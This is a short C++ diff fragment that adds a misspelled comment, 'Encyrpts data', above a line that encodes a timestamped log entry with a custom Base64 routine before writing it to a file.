@@ -50,6 +50,7 @@ namespace IO
 
 			std::ostringstream s;
 			s << "[" << dt.GetDateTimeString() << "]" << std::endl << t << std::endl;
+			//Encyrpts data
 			std::string data = Base64::CustomEncrypt(s.str());
 			file << data;
 
